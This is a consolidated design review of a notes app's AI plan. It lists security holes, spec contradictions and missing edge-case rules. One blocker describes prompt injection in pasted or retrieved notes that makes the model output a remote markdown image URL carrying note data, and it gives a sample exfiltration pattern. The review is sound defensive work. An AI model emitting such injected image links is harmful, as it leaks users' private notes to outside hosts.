# Consolidated Review — `docs/PLAN.md` (AI focus)

**Date:** 2026-10-29
**Mode:** consolidated, all rubrics, run without stopping.
**Target:** `docs/PLAN.md` (FeatureRange 1..614, DetailedRange 615..936).
**Context given to the reviewers:** `docs/TRACKER.md`, `CLAUDE.md`, and the code.
**Question:** "Am I missing any important details or features, specifically in terms of the AI work?"

Stage reports in this folder:

- `zoom_out_report.md`
- `comprehension_report.md`
- `critic_report.md`
- `intermediate_zoom_out_report.md`
- `implementation_readiness_report.md`

All 10 reviewers completed; none failed. The document was not edited during the review.

## Answer in brief

You are not missing big AI features. Embeddings, agents, web access and memory across chats are correctly left out. What you are missing:

1. **Three security holes in the shipped code**, which the spec does not cover. These matter most.
2. **Rules for edge cases** where a real local model behaves differently from the fake one:
   - cut-off replies
   - chatty preambles
   - non-Latin token counts
   - failures mid-stream
3. **A spec that disagrees with itself and with the code.** §4.11, written in P7, was never updated after §4.26 (P22). A fresh session would build the old behaviour.
4. **No real-model verification.** Every P22 task was accepted with the fake AI.

The one feature worth adding now: **`@vault` should send the matching section of each hit, not the whole note.** At the 8k window the notes share is about 3.7k tokens, so only about one whole note fits.

All findings marked "verified" below were checked against the code by the main session.

## 🔴 Blockers

| ID | Finding | Smallest fix | Source |
|---|---|---|---|
| **A1** | **Chat replies load remote images, so notes can leak.** A reply containing `![](https://x/?d=…)` renders as `<img src="https://…">` (`ui.html(sanitize=False)`, chat.py:443/937). There is no CSP for app pages. Injected text in a pasted note, an outside file or an `@vault` hit can make the model send note contents out. **Verified.** | Apply the editor's "never fetch remote images" rule (L209) to chat output, add CSP `img-src 'self' data: blob:`, and open links in replies only via the system browser after a confirm | Critic D-B1; Stage 8 P1 |
| **A2** | **A copied vault's `vault.toml` can override AI security keys.** `config.py:154` merges every key. A vault can set `ai.host` (notes sent to a remote host after Allow), `ai.instructions_file` (any absolute file read on every message, bypassing `AccessPolicy`), `ai.edits=auto` and `ai.chats_folder` (absolute). **Verified.** | Make `ai.host`, `ai.instructions_file`, `ai.prompts_file`, `ai.chats_folder` and `ai.edits` global-only. Run the instruction and prompts files through `AccessPolicy`. Warn once when the host is not loopback | Critic D-B2; Stage 8 P2 |
| **A3** | **A cut-off reply becomes a destructive edit.** The Fix grammar and Edit selection is never counted against the budget (engine.py:691), `num_predict` is never sent and `done_reason` is never read. **Verified.** A long selection gets a truncated reply, which becomes a proposal that deletes the tail. Under *Apply at once* it is applied without review | (1) Run replace edits only when 2 × selection + prompt fit the window, else show a notice. (2) A reply without `done_reason == "stop"` never becomes an edit. (3) A reply shorter than half the original falls back to *Ask first* | Stage 8 Z-1 |
| **A4** | **The spec contradicts itself and the code.** §4.11 is stale against §4.26 (budget, `num_ctx = 0`, Fix grammar, StreamInsert, chats in memory, "vault reading out of scope", "separate install"). PLAN names things that don't exist or differ: `ai.file_types` / `ai.exclude` keys, `EditProposal` with a hash, the `Provider.chat` signature, the `.paper-pile/chats` path, the per-turn `context` field | Rewrite §4.11 to describe reality, or mark each bullet "superseded by §4.26". Fix the six code mismatches (C-5…C-10). Update the §3 `core/ai/` tree | Zoom M1; Comp #4; Struct B1; Style M1–3/M9; Design M9; Codebase C-5…C-11 |
| **A5** | **"The AI never writes into a note" is false as written (L529).** Continue writing, Summarize and Explain stream into the note under the default mode. Autosave keeps partial text after Stop or a crash | State the rule: inserts stream and are one undo step with a version kept first; typing, a tab switch or Stop ends the stream and keeps what arrived; replace-type edits are always proposals; *Read-only* refuses both. Write it as a mode × entry-point matrix | Zoom M2; Comp #3; Style B1; Design M1; Stage 8 P4 |

## 🟡 Major

| ID | Finding | Smallest fix | Source |
|---|---|---|---|
| **B1** | **Auto selection chips skip `ai: false` / exclusions.** With the default `selection_to_chat = auto`, a selection in a private note is sent. Saved quotes are re-sent without a policy check. PLAN L810 says otherwise. **Verified.** | No automatic chip from a note the policy refuses. Re-check saved quotes before re-sending. Update P22.6's acceptance | Design B3; Codebase C-3; Stage 8 P10 |
| **B2** | **A revoke followed by re-Allow wipes "Never read" exclusions.** `revoke` deletes the record and `grant_now` writes an empty `exclude`. **Verified.** `/compact` also skips the access check, so it still sends the transcript after a revoke. **Verified** | Keep `exclude` across a revoke (or mark the record revoked instead of deleting it). Make `/compact` call `confirm_access` | Codebase C-14, C-17 |
| **B3** | **Chat *Apply to note* and *Apply at once* save no "before AI" version.** Only `_run_stream` calls `keep_version`. **Verified** | Call `keep_version` in `propose_edit`. Add it to P22.7's acceptance with a test | Readiness M3; Codebase C-1 |
| **B4** | **Chatty model replies become edits.** `edit_from_reply` takes the whole reply unless it is one code block. "Sure, here's…" lands in the note | One rule: the prompt asks for bare text or one fenced block, and one leading or trailing preamble line is stripped. Add tests with a real-model-style reply | Zoom M4; Readiness M2 |
| **B5** | **Prompt assembly is defined in three places.** It is unclear whether the current note is sent without a chip, whether linked notes are still added, whether the live buffer or the disk is read, and how earlier notes are re-sent (the two descriptions conflict, and the caching claim is wrong) | One definition (L537–538): the current note is implicit or not (decide); open notes are read from the live buffer; earlier notes stay in their own turn. Mark L307–312 as superseded | Comp #1, #2, #6; Design M4; Stage 8 P5, Z-4 |
| **B6** | **`@vault` sends whole notes into a budget that fits about one.** Hits 2–3 are cut or dropped, and hit 1 loses its end, often the matching passage | Send the matching section of each hit (`core/sections.py`), each capped at about ⅓ of the notes share | Stage 8 Z-2 |
| **B7** | **The user can't tell which note was cut.** "(some cut)" is easy to miss, so Summarize on a long note looks complete | Name what was cut in the context line, e.g. "note (first 40 %)" | Stage 8 Z-3 |
| **B8** | **chars ÷ 4 undercounts Bengali by 2–4×.** Ollama then silently cuts the start of the prompt (the system prompt, instruction and summary) | Count each non-ASCII character as one token. Add a Bengali test in an 8k window | Zoom M5; Design M2; Stage 8 Y2 |
| **B9** | **Compaction flaws.** `transcript[-limit*4:]` drops the old summary first. A failed summary is retried before every message (300 s timeout). There is no progress indicator or Stop. The failure path is untested (FakeProvider cannot fail). `/compact` shows "Nothing to summarize yet" on an error | Cut whole turns and keep the summary. No retry until N new turns. Show "Summarizing…" with Stop. Add a failure mode to FakeProvider and a test | Design M3; Readiness M7; Codebase C-16 |
| **B10** | **No failure table.** Missing: a model not pulled or deleted, no models at all, Ollama dying mid-stream (what happens to the partial chat reply or partial note insert), a timeout, two AI operations at once, a cached `show` failure keeping 8k, several `--serve` tabs on one chat file | A five-to-seven-row table (event → what the user sees → what is kept). One generation at a time; Stop closes the HTTP stream | Zoom M3/M6; Comp #9; Design M8; Readiness M8; Stage 8 P7, Y3 |
| **B11** | **No real-model verification.** Every P22 row was accepted with the fake AI, and §6 QA has one AI line | Add **P22.13 Real-model pass** with named models (small instruct, thinking, < 8k window). Check: `show` returns a length, `num_ctx` is honoured, thinking appears (`think=` is never passed), compaction stays ≤ 200 words, edits are bare text, Stop cancels. Add AI lines to the QA checklist | Readiness M1; Style(9) 12; Codebase C-15 |
| **B12** | **The edit-mode gate lives in the GUI and has one test.** This contradicts P22.2's "UI only draws" and CLAUDE.md rule 1 | `AiEngine.edit_action(mode, kind)` in core, with a unit test per cell of the matrix (A5) | Readiness M4; Codebase C-4 |
| **B13** | **Retrieval has no decision.** `Provider.embed` and the embed-model setting ship but nothing uses them. L465 says vault reading is out of scope | Declare FTS `@vault` the phase-1 retrieval. Remove `embed()` and the setting. Delete L465. Keep §7's RAG line. Record the decision | Zoom B1; Stage 8 Y1 |
| **B14** | **§5 has no AI data formats.** The chat JSON and `ai_access.json` are missing. Which source wins for `file_types` / `exclude` is unclear | Field lists for both. State that `ai_access.json` is authoritative | Comp #7; Struct B3; Stage 8 P8 |
| **B15** | **§8 has no AI risks.** The existing mitigation ("small default budget") is stale | Rows for: prompt injection (worse under *Apply at once*), a remote host, silent truncation, outside grants in `--serve`, Ollama API drift, VRAM from a manual `num_ctx`, the token estimate, the unbounded `NoteCache` | Zoom M7; Comp #8; Struct B2; Design M5; Readiness M6; Codebase C-14 |
| **B16** | **Outside grants have no limits.** One Allow can grant `~` or `/`, hidden files are read, and `os.walk` runs synchronously on the UI loop | Refuse `/` and `~` themselves, skip hidden files and folders, walk off the event loop | Design M6; Stage 8 Y8 |
| **B17** | **Rewrite never reaches a diff.** The ⋯ Rewrite goes to chat, and *Apply to note* needs exactly one selection | Decide the region (the body via `parser.body_start`) and the entry point, or drop Rewrite from the proposal list | Style M12; Codebase C-2 |
| **B18** | **AI switch precedence is undefined.** `features.ai` vs `--ai` vs `PAPER_PILE_AI`, `NO_AI` and `FAKE_AI` | One precedence line | Style M2 |
| **B19** | **Stale or untestable task rows.** The P7 table lacks P7.5–P7.7. P7.3 and P7.4 are superseded. P22.1, P22.5, P22.6, P22.7, P22.8, P22.9 and P22.11 have "works" / "each behave" acceptance or wrong mode names | Update the rows with concrete pass/fail lines (see `implementation_readiness_report.md`, W-1…W-10) | Style(9) 1–10 |
| **B20** | **Settings → AI is described four ways**, and the settings table lacks Access, `ai.edits`, `ai.selection_to_chat` and `ai.prompts_file` | One table of all `ai.*` keys and defaults | Struct M4; Style M15 |
| **B21** | **Proposal life cycle undefined** (tab switch, close, rename, split view, reload, restart, stacking) | One line: in memory only, dropped on close, reload or restart; a new proposal replaces the old one in the same note | Design M7; Stage 8 Y8 |

## 🟢 Nits (grouped)

- **Terms**:
  - "Memories" (saved chats) vs "long-term memory" (Not now) vs §4.24 Memory (RAM)
  - "Ask" has five meanings
  - "turn" vs "message"
  - "prompt's room"
  - "Write with AI" is used for two features
  - undefined: block, settled selection, notice/banner
- **Numbers**:
  - `context_budget` 6000 never binds (60 % × 6144 ≈ 3686)
  - chip count ≤ 6 vs 3–4
  - `@vault` "best few" vs "3"
- **Docs hygiene**:
  - §3 tree, §4.1 CLI (`--ai`, `--debug`), §7 Deferred stale
  - §4 numbering out of order
  - "Implemented" paragraphs full of function names
  - the 🧠 table incomplete
  - P22 before P21
  - "(real app)" undefined
  - `ollama` not pinned
- **Small code items**:
  - an `ai: false` `@vault` hit takes one of the 3 slots
  - the status dot has no "model missing" state
  - the "start it with `ollama serve`" banner is wrong for a remote host
- **To decide (low priority)**:
  - images are never sent (say so)
  - `@vault` with non-English queries and zero hits
  - an 8k cap reason recorded (RAM/VRAM; `ai.num_ctx` raises it)
  - the same `num_ctx` and `keep_alive` on every call, to avoid model reloads
- **Reuse** (C-18): `parser.front_matter`, `parser.body_start`, `sections`, the index `links` table, `NoteCache` / `read_note`, `Index.search(any_words=True)`.

## Proposals the reviewers raised, then dropped as YAGNI (Stage 8)

- An embeddings / vector design
- Per-model token calibration
- A `/api/ps` loading state
- Unloading the model when AI is off
- A context preview before sending
- The model saved per chat or per turn
- Retry/backoff
- Throttled streaming re-render (measure first)
- Purging saved chats on revoke
- The host stored in grants
- Undo on unopened notes
- A full document restructure
- Seven decision records (keep two: FTS vs embeddings, the 8k cap)

## Suggested order of work

1. **Security, in code**: A1, A2, B1, B2, then A3 and B3/B4. These are code fixes plus a spec paragraph each.
2. **Spec truth**: A4 (stale pass), A5 (write contract), B5 (one prompt-assembly definition), B13, B14, B20.
3. **Real-model task**: B11, which also exercises B4, B8, B9 and B10.
4. **Feature improvement**: B6 (section-level `@vault`), B7.
5. **Plan sections and acceptance**: B15, B19, nits.

## Traceability matrix

| Consolidated | Raw findings |
|---|---|
| A1 | Critic D-B1; Stage 8 P1 |
| A2 | Critic D-B2; Zoom M7 (remote host); Comp #8; Stage 8 P2 |
| A3 | Stage 8 Z-1 |
| A4 | Zoom M1, N8; Comp #4, #10; Struct S-B1, S-M3, S-M5, S-M6; Style W-M1–M3, M9, M14, M18; Design D-M9; Codebase C-5…C-11; Style(9) W-13 |
| A5 | Zoom M2; Comp #3; Style W-B1, S-N3; Design D-M1; Stage 8 P4 |
| B1 | Design D-B3; Style W-M7; Codebase C-3; Stage 8 P10 |
| B2 | Codebase C-14, C-17 |
| B3 | Readiness R-M3; Codebase C-1 |
| B4 | Zoom M4; Readiness R-M2 |
| B5 | Comp #1, #2, #6; Design D-M4; Style W-M8; Zoom N1; Stage 8 P5, Z-4 |
| B6 | Stage 8 Z-2 |
| B7 | Stage 8 Z-3 |
| B8 | Zoom M5; Design D-M2; Readiness R-M8.5; Stage 8 Y2, P6 |
| B9 | Zoom N2; Design D-M3; Style W-M10, W-M11; Readiness R-M7; Codebase C-16; Style(9) W-9 |
| B10 | Zoom M3, M6, N3, N4; Comp #9; Struct S-B2; Style W-M16; Design D-M8; Readiness R-M8.1–3; Stage 8 P7, Y3 |
| B11 | Zoom N7; Readiness R-M1; Style(9) W-12; Codebase C-15, C-16 |
| B12 | Readiness R-M4; Codebase C-4 |
| B13 | Zoom B1, M10; Style W-M3, W-M14; Stage 8 Y1 |
| B14 | Comp #7; Struct S-B3; Style W-M5, W-N6; Stage 8 P8 |
| B15 | Zoom M7; Comp #8; Struct S-B2; Design D-M5; Readiness R-M6, R-M8.4; Style(9) W-14; Codebase C-14 |
| B16 | Design D-M6; Style W-N10; Stage 8 Y8 |
| B17 | Style W-M12; Codebase C-2 |
| B18 | Style W-M2 |
| B19 | Style(9) W-1…W-11, W-15…W-21; Readiness R-N1, R-N4…R-N7; Codebase C-12, C-17 |
| B20 | Struct S-M4; Style W-M15; Zoom M10 |
| B21 | Design D-M7; Stage 8 Y8 |
| Nits | Zoom M9, N5, N6; Comp #5, #10–#16; Struct S-M1, S-M2, S-M7, S-N1…S-N7; Style W-M4, W-M6, W-M13, W-M17, W-N1…W-N9; Design nits; Stage 8 Z-5, Y6; Codebase C-18 |
